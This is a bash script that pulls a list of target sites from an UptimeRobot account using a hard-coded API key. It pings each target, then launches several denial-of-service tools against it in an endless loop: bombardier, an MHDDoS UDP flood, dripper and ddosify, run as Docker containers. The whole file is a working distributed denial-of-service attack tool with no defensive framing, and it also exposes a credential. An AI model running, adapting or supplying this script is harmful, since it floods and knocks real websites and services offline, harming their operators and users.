#!/bin/bash
DURATION=300
THREADS=10
while [ 1 ]
do
  PAGE=$(curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cache-Control: no-cache" -d 'api_key=ur1650084-49bb4fb61845b76b0b16fda7&format=json&logs=0' "https://api.uptimerobot.com/v2/getMonitors")
  URLS=$(echo "$PAGE" | cut -d ':' -f5 | tr -dc '0-9')
  if [[ "$URLS" != "" ]]; then
    UP=$(echo "$PAGE"|sed 's/_name":"/@/'|cut -d '@' -f2|sed 's/_name":"/\n/g'|cut -d '"' -f1,2,5,6,38 |sed 's/"//g'|sed 's_http://__g'|sed 's_https://__g'|sed 's_/__g')
    UP=$(echo "$UP" | sed 's/@/\n/g' | cut -d ',' -f1,2 | shuf)
    while read -r L; do
      if [[ $(docker ps -q | wc -l) > 0 ]]; then
        docker container kill $(docker container ls -q)
      fi

      TI=$(ping -c 1 -W 1 $(echo "$L" | cut -d "," -f2) | grep PING | cut -d '(' -f2 | cut -d ")" -f1)
      if [ -z "$TI" ]; then
        echo SKIP:$(echo "$L" | cut -d "," -f1)
      else
        echo "Attack URL: "$(echo "$L" | cut -d "," -f1)
        docker run -d --rm alpine/bombardier -c $THREADS -d "$DURATION"s  -l $(echo "$L" | cut -d "," -f2)
        docker run -d --rm sl4vin/mhddos python start.py udp $TI $THREADS $DURATION
        docker run -d --rm alexmon1989/dripper -t $THREADS -s $(echo "$L" | cut -d "," -f2)
        docker run -d --rm ddosify/ddosify ddosify -n $THREADS -d $DURATION -t $(echo "$L" | cut -d "," -f2)
        echo Wait $DURATION seconds for finish Attack
        sleep "$DURATION"
      fi
    done < <(printf '%s\n' "$UP")

  else
    echo URLs not found!
  fi
done
